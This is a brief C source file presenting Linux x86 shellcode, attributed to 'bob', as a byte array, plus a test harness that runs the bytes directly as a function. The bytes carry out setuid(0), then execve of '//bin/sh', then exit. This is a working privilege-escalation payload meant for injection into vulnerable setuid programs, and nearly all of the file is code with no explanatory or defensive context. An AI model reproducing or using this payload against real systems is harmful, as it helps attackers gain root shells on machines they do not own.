/* Linux x86 shellcode by bob */
/* setuid(); execve(); exit(); */

#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"
		"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f"
		"\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
		"\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0"
		"\xb0\x01\xcd\x80";
int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode));
        dsr();
}